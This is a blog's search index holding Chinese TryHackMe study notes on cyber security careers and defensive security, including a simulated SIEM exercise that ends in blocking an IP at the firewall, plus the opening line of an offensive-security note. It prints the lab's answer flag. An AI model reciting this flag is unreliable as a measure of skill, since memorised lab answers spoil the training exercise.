<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>THM-Careers in Cyber(网络安全职业介绍)-学习</title>
    <url>/2024/01/16/THM-Careers%20in%20Cyber(%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/careersincyber" >https://tryhackme.com/room/careersincyber <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文介绍：了解网络安全领域的不同职业。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>网络安全行业有许多不同的工作种类，主要分为进攻性安全（对目标进行渗透测试以及产出漏洞报告）和防御性安全（防御、调查网络攻击）。</p>
<p>本文将通过提供有关各种网络安全角色的基础信息介绍来帮助你了解网络安全领域的职业情况；在本文的内容中还会给出一些相关的链接，这些链接将指向Tryhackme平台上的不同学习路径，你可以使用这些路径进行学习从而培养你的网络安全技能（这里指的是基础级别的技能）。</p>
<h2 id="安全分析师-Security-Analyst"><a href="#安全分析师-Security-Analyst" class="headerlink" title="安全分析师(Security Analyst)"></a>安全分析师(Security Analyst)</h2><p>此职业主要负责维护组织的数据安全性。安全分析师是跨组织构建安全措施以保护公司免受攻击不可或缺的一部分，分析师将探索和评估公司网络，以发现可操作的数据并建议工程师制定预防措施。 此工作角色需要与各种利益相关者合作，以了解安全要求和安全形势。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/5504f125b74401f8633bccd831e4c785.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>与各利益相关者合作，分析整个公司的网络安全</li>
<li>编制有关网络安全的持续报告，记录安全问题和建议采取的应对措施</li>
<li>结合对新攻击工具和新攻击趋势的研究：制定安全计划、制定跨团队维护数据安全所需的措施。</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/presecurity" >https://tryhackme.com/path/outline/presecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/blueteam" >https://tryhackme.com/path/outline/blueteam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/soclevel1" >https://tryhackme.com/path/outline/soclevel1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/jrpenetrationtester" >https://tryhackme.com/path/outline/jrpenetrationtester <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="安全工程师-Security-Engineer"><a href="#安全工程师-Security-Engineer" class="headerlink" title="安全工程师(Security Engineer)"></a>安全工程师(Security Engineer)</h2><p>此职业主要负责设计、监控和维护安全控制、网络和系统，以帮助防御各种网络攻击。安全工程师基于威胁情报和漏洞信息来开发和实施安全解决方案——威胁情报和漏洞信息通常来自安全团队成员。 安全工程师致力于规避各种攻击，包括 Web 应用程序攻击、网络威胁以及不断发展的新型攻击趋势和策略，最终目标是保持并采用安全措施来降低攻击风险和数据丢失风险。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/037b40529f9a15660ee458245c8c14dc.png"
                      alt="img" style="zoom: 50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>跨软件测试和筛选安全措施。</li>
<li>监控网络和报告 以更新系统和缓解漏洞威胁。</li>
<li>确定并实施系统所需的安全解决方案，以获得最佳安全性。</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/presecurity" >https://tryhackme.com/path/outline/presecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/blueteam" >https://tryhackme.com/path/outline/blueteam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/jrpenetrationtester" >https://tryhackme.com/path/outline/jrpenetrationtester <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/pentesting" >https://tryhackme.com/path/outline/pentesting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="应急响应人员-Incident-Responder"><a href="#应急响应人员-Incident-Responder" class="headerlink" title="应急响应人员(Incident Responder)"></a>应急响应人员(Incident Responder)</h2><p>此职业主要负责 在攻击者的操作仍在开展时识别并缓解攻击。应急响应人员需要对安全漏洞做出富有成效和高效的响应，工作职责是为组织制定计划、政策和协议，以便在攻击事件发生期间和攻击事件发生后得到执行。这通常是一个压力很大的职位，随着网络攻击的展开，应急响应人员需要实时对攻击进行评估和响应，常用的事件响应指标包括 MTTD、MTTA 和 MTTR等——即平均检测、确认和恢复时间（从网络攻击事件中），应急响应的目的是实现快速有效的响应，保持公司财务状况并避免公司受到负面的违规影响。</p>
<p>简而言之，应急响应人员最终需要保护公司的数据、声誉和财务状况免受网络攻击的影响。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/6a48b0ea257a587d560ffef4b28f4d35.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>制定并采用全面、可操作的事件响应计划</li>
<li>保持强大的安全最佳实践并支持事件响应措施</li>
<li>完成事件后报告并为未来的攻击做准备，适应攻击事件并从攻击事件中吸取教训</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/presecurity" >https://tryhackme.com/path/outline/presecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/blueteam" >https://tryhackme.com/path/outline/blueteam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/soclevel1" >https://tryhackme.com/path/outline/soclevel1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/jrpenetrationtester" >https://tryhackme.com/path/outline/jrpenetrationtester <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="数字取证审查员-Digital-Forensics-Examiner"><a href="#数字取证审查员-Digital-Forensics-Examiner" class="headerlink" title="数字取证审查员(Digital Forensics Examiner)"></a>数字取证审查员(Digital Forensics Examiner)</h2><p>此职业主要负责进行数字取证以调查网络安全事件和网络安全犯罪行为。如果你喜欢扮演侦探，这可能是一个完美的网络安全工作；如果你是执法部门的一员，你将专注于收集和分析证据以帮助破案：指控有罪者并且为无辜者正名；另一方面，如果你的工作属于保护公司网络的范畴，你将使用数字取证技能来分析事件，例如找出网络攻击者违反法律的证据。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/22747e6c2cffce6de0c93f456784be37.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>在遵守法律程序的同时收集数字证据</li>
<li>分析数字证据以找到与案件相关的答案</li>
<li>记录你的发现并在相关案例中进行报告</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/blueteam" >https://tryhackme.com/path/outline/blueteam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/soclevel1" >https://tryhackme.com/path/outline/soclevel1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="恶意软件分析师-Malware-Analyst"><a href="#恶意软件分析师-Malware-Analyst" class="headerlink" title="恶意软件分析师(Malware Analyst)"></a>恶意软件分析师(Malware Analyst)</h2><p>此职业主要负责分析所有类型的恶意软件以更多地了解它们的工作原理和作用。恶意软件分析师的工作包括分析可疑程序、发现软件的恶意行为并编写有关报告。 恶意软件分析师有时也被称为<em><strong>逆向工程师</strong></em>，因为他们的核心任务围绕着 将已经编译的程序从机器语言转换为可读代码，通常是将低级计算机语言转换为高级语言，这项工作要求恶意软件分析师具有强大的编程背景，尤其是要了解汇编语言和 C 语言等。</p>
<p>恶意软件分析师的最终目标是了解恶意程序执行的所有活动，了解如何检测和报告软件的恶意行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/49b9585d464f633da235ad1ac6e657d8.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>对恶意程序进行静态分析，这需要进行逆向工程。</li>
<li>通过观察受控环境中的活动对恶意软件样本进行动态分析。</li>
<li>记录并报告所有发现。</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/blueteam" >https://tryhackme.com/path/outline/blueteam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/soclevel1" >https://tryhackme.com/path/outline/soclevel1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="渗透测试人员-Penetration-Tester"><a href="#渗透测试人员-Penetration-Tester" class="headerlink" title="渗透测试人员(Penetration Tester)"></a>渗透测试人员(Penetration Tester)</h2><p>此职业主要负责测试技术产品的安全漏洞。渗透测试人员也被称为道德黑客，渗透测试人员的工作职责是测试公司内部系统和软件的安全性——通过尝试系统化的黑客攻击行为来发现安全缺陷和安全漏洞。 渗透测试人员利用所发现的漏洞来评估每个实例的风险，然后，公司可以利用相关的漏洞报告来纠正安全问题，以防止现实世界中的网络攻击。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/1b9ac0842dca3efabbc15387fc4f0261.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li>对计算机系统、网络和基于 Web 的应用程序进行测试。</li>
<li>执行安全评估、安全审计和安全分析策略。</li>
<li>完成评估并进行报告，推荐攻击预防措施。</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/presecurity" >https://tryhackme.com/path/outline/presecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/jrpenetrationtester" >https://tryhackme.com/path/outline/jrpenetrationtester <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/pentesting" >https://tryhackme.com/path/outline/pentesting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="红队人员-Red-Teamer"><a href="#红队人员-Red-Teamer" class="headerlink" title="红队人员(Red Teamer)"></a>红队人员(Red Teamer)</h2><p>此职业主要负责在攻防中扮演对抗者的角色，攻击目标组织并从敌人的角度提供网络安全反馈。红队与渗透测试员有相似之处，但是红队是一个具有更有针对性的工作角色。渗透测试人员往往希望发现系统中的许多漏洞，以保持网络防御的良好状态；而红队则负责测试公司的攻击检测和响应能力，红队人员需要模仿网络罪犯的行为、模拟恶意攻击、保留访问权限(留后门)并避免被发现。红队评估行动往往可以运行一个月之久，这通常是由公司外部的团队来进行的，这些外部团队往往会对拥有成熟安全程序的组织开展红队评估。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/4fa8afd51656c084df33a42566709610.png"
                      alt="img" style="zoom:50%;" 
                >

<p><strong>职责</strong></p>
<ul>
<li><p>模拟威胁行为者的角色，发现可利用的漏洞、维持访问权限（留后门）并避免被发现。</p>
</li>
<li><p>评估目标组织的安全控制、威胁情报和事件响应程序。</p>
</li>
<li><p>完成评估并进行报告，为公司提供可操作的数据以避免真实世界的攻击实例。</p>
</li>
</ul>
<p><strong>Tryhackme平台提供的相关学习路径（基础级别技能）</strong></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/jrpenetrationtester" >https://tryhackme.com/path/outline/jrpenetrationtester <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/pentesting" >https://tryhackme.com/path/outline/pentesting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://tryhackme.com/path/outline/redteaming" >https://tryhackme.com/path/outline/redteaming <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Intro to Defensive Security(防御性安全介绍)-学习</title>
    <url>/2024/01/16/THM-Intro%20to%20Defensive%20Security(%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/defensivesecurityhq" >https://tryhackme.com/room/defensivesecurityhq <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：介绍防御性安全和相关主题，例如威胁情报、SOC、DFIR 和 SIEM。</p>
<h2 id="防御性安全简介"><a href="#防御性安全简介" class="headerlink" title="防御性安全简介"></a>防御性安全简介</h2><p>进攻性安全专注于一件事：闯入系统。 进攻性安全领域的职业人员可以通过利用现有错误、滥用不安全的设置以及利用未强制执行的访问控制策略等方式侵入目标系统。 红队和渗透测试人员专注于进攻性安全。</p>
<p>防御性安全在某种程度上与进攻性安全相反，它涉及两个主要任务：</p>
<ul>
<li>防止入侵发生</li>
<li>在入侵发生时检测入侵并做出正确响应</li>
</ul>
<p>蓝队是防御性安全领域的一部分。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232248643-1808428703.png"
                      alt="image"
                ></p>
<p>一些与防御性安全相关的任务：</p>
<ul>
<li><p>培养用户网络安全意识：对用户进行网络安全培训有助于防止针对系统的各种攻击。</p>
</li>
<li><p>记录和管理资产：我们需要知道我们必须妥善管理和保护的系统和设备的类型。</p>
</li>
<li><p>更新和修补系统：确保计算机、服务器和网络设备针对任何已知漏洞（弱点）进行正确的版本更新和补丁修补。</p>
</li>
<li><p>设置预防性安全设备：防火墙和入侵防御系统 (IPS) 是预防性安全的重要组成部分。 防火墙可以控制哪些网络流量可以进入系统或网络，以及哪些流量可以离开系统或网络。 IPS 会阻止任何符合当前规则和攻击特征的网络流量。</p>
</li>
<li><p>设置日志记录和监控设备：如果没有进行适当的网络日志记录和网络监控，就不可能检测到恶意活动和入侵行为。 如果我们管理的网络中出现了新的未经授权的可疑设备，我们应该能够及时知道。</p>
</li>
</ul>
<p>防御性安全还有很多要求，上面的列表只涵盖了几个常见的安全任务。</p>
<p>以下是防御性安全的常见相关主题</p>
<ul>
<li>安全运营中心 (SOC)</li>
<li>威胁情报</li>
<li>数字取证和事件响应 (DFIR)</li>
<li>恶意软件分析</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319104624034.png"
                      alt="image-20230319104624034"
                ></p>
<h2 id="防御性安全相关领域介绍"><a href="#防御性安全相关领域介绍" class="headerlink" title="防御性安全相关领域介绍"></a>防御性安全相关领域介绍</h2><p>在本小节中，我们将涵盖与防御性安全相关的两个主要主题：</p>
<ul>
<li>安全运营中心 (SOC)，涵盖了威胁情报处理。</li>
<li>数字取证和事件响应 (DFIR)，涵盖了恶意软件分析。</li>
</ul>
<h3 id="安全运营中心-SOC"><a href="#安全运营中心-SOC" class="headerlink" title="安全运营中心(SOC)"></a>安全运营中心(SOC)</h3><p>安全运营中心(SOC-Security Operations Center) 是一个由网络安全专业人员所组成的团队，主要负责监控网络及其系统以检测恶意网络安全事件。</p>
<p>SOC 的一些主要兴趣领域是：</p>
<ul>
<li><p>漏洞：每当发现系统漏洞（弱点）时，必须通过安装适当的更新包或者补丁来修复漏洞，当修复方案不可用时，则应采取必要的措施来防止攻击者利用漏洞。 尽管修复漏洞对 SOC 至关重要，但这项任务实际上不一定会分配给他们来完成。</p>
</li>
<li><p>策略违规：我们可以将安全策略视为保护网络和系统所需的一组规则；例如，如果用户将公司机密数据上传到公开的在线存储服务，则可能违反了安全策略。</p>
</li>
<li><p>未经授权的活动：如果用户的登录名和密码被盗取，那么攻击者就可以使用盗取到的凭据进行登录行为；SOC 需要检测此类事件 并在攻击者造成进一步损坏之前尽快进行阻止。</p>
</li>
<li><p>网络入侵：无论你的安全性有多好，攻击者进行入侵的机会总是存在。当用户单击恶意链接或攻击者利用公共服务器时，也可能会发生网络入侵事件；不管怎样，当网络入侵发生时，我们就必须尽快检测到它，以防止进一步的破坏。</p>
</li>
</ul>
<p>SOC的安全操作涵盖了各种任务以保护公司网络及系统，其中也包含了威胁情报处理。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232324077-921784249.png"
                      alt="image"
                ></p>
<h4 id="威胁情报-Threat-Intelligence"><a href="#威胁情报-Threat-Intelligence" class="headerlink" title="威胁情报(Threat Intelligence)"></a>威胁情报(Threat Intelligence)</h4><p>在网络安全中：情报指的是你收集到的关于实际和潜在敌人的信息，威胁指的是任何可能破坏系统或对系统产生不利影响的行为。</p>
<p>威胁情报旨在收集信息，以帮助公司更好地应对潜在的攻击者，了解威胁情报的目的是实现威胁知情防御；不同的公司会吸引不同类型的网络攻击者，一些攻击者可能会试图从移动运营商处窃取客户数据，另外一些攻击者可能会有兴趣破坏炼油厂的网络以使其停止生产。</p>
<p>典型的网络攻击者包括出于政治原因工作的国家网络军队以及出于财务目的行事的勒索软件组织，基于公司（目标）的性质，我们就可以知道预期的攻击者类型。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232336558-1363855465.png"
                      alt="image"
                ></p>
<p>情报需要数据，我们必须收集、处理和分析数据：我们首先需要进行数据收集，具体的数据收集来源分为本地来源（例如网络日志）和公共来源（例如网络论坛）；得到数据之后，我们还需要对数据进行处理，数据处理旨在将数据排列成适合分析的格式；最后是数据分析阶段，此阶段旨在找到有关攻击者及其动机的更多信息，另外，数据分析还旨在创建建议列表和可操作步骤列表。</p>
<p>威胁情报可以让我们了解潜在攻击者的战术、技术和程序，妥善处理威胁情报的好处是：我们可以识别威胁参与者（对手），预测他们的攻击活动，最终能够减轻他们的攻击危害并能及时准备响应策略。</p>
<h3 id="数字取证和事件响应-DFIR"><a href="#数字取证和事件响应-DFIR" class="headerlink" title="数字取证和事件响应(DFIR)"></a>数字取证和事件响应(DFIR)</h3><p>接下来我们将介绍数字取证和事件响应 (DFIR-Digital Forensics and Incident Response)，主要将涵盖以下内容：</p>
<ul>
<li>数字取证</li>
<li>事件响应</li>
<li>恶意软件分析</li>
</ul>
<h4 id="数字取证-Digital-Forensics"><a href="#数字取证-Digital-Forensics" class="headerlink" title="数字取证(Digital Forensics)"></a>数字取证(Digital Forensics)</h4><p>取证是指应用科学技术来调查犯罪情况和确定事实。随着计算机和智能手机等数字系统的使用和普及，为了调查和数字系统相关的犯罪情况，一个新的取证学分支得以诞生：计算机取证——后来逐渐演变为数字取证。</p>
<p>在防御性安全方面，数字取证的重点转移到了分析攻击证据、分析攻击者以及分析其他领域：如知识产权盗窃、网络间谍活动、拥有未经授权的内容等。 </p>
<p>数字取证将侧重于不同的区域，例如：</p>
<ul>
<li><p>文件系统：分析来自于系统存储的数字取证图像（低级副本）可以揭示很多信息，例如分析已安装的程序、已创建的文件、部分被覆盖的文件和已删除的文件等。</p>
</li>
<li><p>系统内存：如果攻击者在内存中运行他们的恶意程序而不将其保存到磁盘中，那么获取系统内存的取证图像（低级副本）是分析恶意程序内容和了解恶意攻击的最佳方式。</p>
</li>
<li><p>系统日志：每台客户端和服务器计算机都维护着不同的日志文件来记录正在发生的事情。因此，日志文件能够提供大量关于系统上发生的事情的信息，即使攻击者试图清除他们的行为痕迹，也可能会留下一些线索。</p>
</li>
<li><p>网络日志：遍历网络中的网络数据包日志将有助于回答是否正在发生攻击、是否已经被攻击以及攻击行为所造成的后果是什么。</p>
</li>
</ul>
<h4 id="事件响应-Incident-Response"><a href="#事件响应-Incident-Response" class="headerlink" title="事件响应(Incident Response)"></a>事件响应(Incident Response)</h4><p>事件，在网络安全中通常是指发生数据泄露或发生网络攻击；但是，在某些情况下，有些事件可能不是那么重要，例如配置错误、入侵企图或违反安全策略的行为。</p>
<p>网络攻击的常见示例包括：攻击者使我们的网络或系统无法访问、攻击者破坏（更改）公共网站和发生数据泄露（攻击者窃取公司数据）等。 那么我们将如何应对网络攻击？事件响应指定了出现网络攻击情况时应遵循的方法，事件响应的目的是在网络攻击事件中减少损坏并在尽可能短的时间内恢复正常。在理想情况下，公司的相关安全部门应该制定一个准备好进行事件响应的计划。</p>
<p>事件响应过程的四个主要阶段是：</p>
<ul>
<li><p>准备阶段：这需要一支训练有素并且已经准备好处理安全事件的团队，在理想情况下，要尽量采取各种安全措施来防止事故发生。</p>
</li>
<li><p>检测和分析阶段：事件响应团队要拥有必要的资源来检测安全事件是否发生；此外，事件响应团队还必须进一步分析任何已经检测到的事件以了解其严重性。</p>
</li>
<li><p>遏制、根除和恢复阶段：一旦检测到事件发生，最重要的是要阻止事件影响其他系统、消除恶意事件并恢复受影响的系统。例如，当我们发现一个系统感染了计算机病毒，我们要及时阻止（遏制）病毒传播到其他系统，清除（根除）病毒程序，并使系统恢复正常工作状态。</p>
</li>
<li><p>事后活动阶段：成功恢复系统工作后，要生成一份相关的报告，分享以及吸取教训，以防止未来发生类似事件。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232401249-375105017.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230421125545564.png"
                      alt="image-20230421125545564"
                ></p>
<h4 id="恶意软件分析-Malware-Analysis"><a href="#恶意软件分析-Malware-Analysis" class="headerlink" title="恶意软件分析(Malware Analysis)"></a>恶意软件分析(Malware Analysis)</h4><p>Malware 代表恶意软件，软件是指可以保存在磁盘上或通过网络发送的程序、文档和文件。 </p>
<p>恶意软件包括多种类型，例如：</p>
<ul>
<li><p>病毒(Virus)是将自身附加到程序中的一段代码（是程序的一部分），它旨在从一台计算机传播到另一台计算机； 此外，一旦病毒感染了计算机，它就会通过更改、覆盖和删除文件来发挥危害作用，最终导致的结果是让计算机运行速度变慢直至计算机无法正常使用。</p>
</li>
<li><p>特洛伊木马(Trojan Horse)是一种程序，它会显示自己具有一个理想的正常功能，但实际上程序中还隐藏了一些恶意功能；例如，受害者可能会从可疑网站下载视频播放器，而这个视频播放器可能实际上是一个木马程序，从而攻击者可以完全控制受害者的系统。</p>
</li>
<li><p>勒索软件(Ransomware)是一种加密用户文件的恶意程序，加密会使文件在不知道加密密码的情况下变为不可读状态；用户只有选择支付“赎金”，攻击者才可能会向用户提供加密密码来对用户文件进行解密。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232423140-422842004.png"
                      alt="image"
                ></p>
<p>恶意软件分析旨在使用各种方式了解恶意程序，从而保护网络和系统的安全环境：</p>
<ul>
<li><p>静态分析：在不运行恶意程序的前提下对恶意程序进行检查。通常，这需要扎实的汇编语言知识（处理器的指令集，即计算机的基本指令）。</p>
</li>
<li><p>动态分析：受控环境中运行恶意软件并监控其活动 以进行分析，动态分析可以让你观察恶意软件在运行时的具体行为。</p>
</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319125337268.png"
                      alt="image-20230319125337268"
                ></p>
<h2 id="关于防御性安全的简单实例"><a href="#关于防御性安全的简单实例" class="headerlink" title="关于防御性安全的简单实例"></a>关于防御性安全的简单实例</h2><p><strong>模拟场景介绍</strong></p>
<p>作为安全分析师，你接下来将要执行一个典型任务：</p>
<p>你是负责保护银行的安全运营中心 (SOC-Security Operations Center) 的成员，该银行的SOC使用了安全信息和事件管理 (SIEM-Security Information and Event Management) 系统，SIEM 会通过各种来源收集与安全相关的信息和事件，并通过一个系统呈现它们；例如，如果用户多次尝试登录失败或者有来自意外地理位置的登录尝试行为，你将收到相关的消息通知；此外，随着机器学习的出现，SIEM 还会自动检测某些异常行为，例如某个用户在凌晨 3 点登录，而通常情况下用户应该只在工作时间进行登录。</p>
<p>在本小节的实例中，我们将与 SIEM 交互以实时监控网络和系统上的不同事件。有些事件是典型的、无害的，而有些特殊事件可能需要我们进一步干预，我们将在实例中找到被标记为红色的事件，记下相关信息，然后单击相关记录以开始进一步检查。</p>
<p>在对可疑事件的进一步检查中，我们需要尝试了解有关可疑活动或事件的更多信息，可疑事件警告可能是由某个具体事件触发的，这可能会关联到本地用户、本地计算机或远程 IP 地址。在现实世界中，如果要发送和接收邮件，你需要知道一个实际地址；同样，在网络环境中，你需要一个 IP 地址才能通过 Internet 发送和接收数据，IP 地址是允许你通过 Internet 进行通信的逻辑地址。我们需要检查事件警告触发的原因以确认相关的事件是否确实是恶意的，如果确定是恶意事件，我们就需要采取相应的措施，比如向 SOC 中的其他成员进行报告并屏蔽恶意事件相关的 IP 地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/2857591-20230416232447698-1553382882.png"
                      alt="image"
                ></p>
<p><strong>答题</strong></p>
<p><em>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，并完成本小节对应的实例</em></p>
<p>part1：检查 SIEM 仪表面板中的警报消息，从警报中找到可疑 IP 地址(143.110.250.149)，记下它，然后单击警报消息继续。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319133244202.png"
                      alt="image-20230319133244202" style="zoom: 67%;" 
                >

<p>part2：Internet 上有一些网站允许你检查某个 IP 地址的信誉以查看它是否是恶意的或可疑的；让我们对在part1中发现的可疑 IP 地址进行检查。</p>
<p><em>tips：有许多开源数据库，例如 <a class="link"   href="https://www.abuseipdb.com/" >AbuseIPDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 <a class="link"   href="https://talosintelligence.com/" >Cisco Talos Intelligence <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，你可以在其中对 IP 地址执行信誉和位置检查，大多数安全分析师使用这些工具来帮助他们进行警报调查；你还可以通过报告恶意 IP（例如，在 AbuseIPDB 上）来使 Internet 更安全。</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319133328927.png"
                      alt="image-20230319133328927" style="zoom:50%;" 
                >

<p>part3：查看检查结果，现在我们知道 IP 地址143.110.250.149是恶意的，我们需要将其上报给相关的工作人员。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319131240191.png"
                      alt="image-20230319131240191" style="zoom:80%;" 
                >

<p>part4：如果这只是失败的身份验证尝试，我们不必太担心，但是我们还注意到此恶意 IP 地址有成功的登录尝试记录，所以我们有必要将这一事件上报；我们要将此事件上报给负责相关工作的公司人员。（我们将事件上报给 SOC Team Lead——安全运营中心团队负责人）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319132739037.png"
                      alt="image-20230319132739037" style="zoom: 67%;" 
                >

<p>part5：经过事件上报后，我们已获得阻止恶意 IP 地址(143.110.250.149)访问目标公司的权限，我们可以执行阻止规则，通过防火墙阻止恶意 IP 地址访问目标公司。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319133554203.png"
                      alt="image-20230319133554203" style="zoom: 67%;" 
                >

<p>part6：我们成功完成了这个简单实例，最后我们获取到以下flag内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319133708037.png"
                      alt="image-20230319133708037"
                ></p>
<blockquote>
<p>最后获取到的flag内容是：THM{THREAT-BLOCKED} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318231923119.png"
                      alt="image-20230318231923119"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Intro to Offensive Security(进攻性安全介绍)-学习</title>
    <url>/2024/01/16/THM-Intro%20to%20Offensive%20Security(%E8%BF%9B%E6%94%BB%E6%80%A7%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/careersincyber" >https://tryhackme.com/room/careersincyber <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文介绍：对进攻性安全概念进行简单的讲解。</p>
<h2 id="攻击模拟示例"><a href="#攻击模拟示例" class="headerlink" title="攻击模拟示例"></a>攻击模拟示例</h2><p>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，我们需要完成的操作是：攻击一个名为 FakeBank 的web应用程序（一个虚拟的银行web应用程序）。</p>
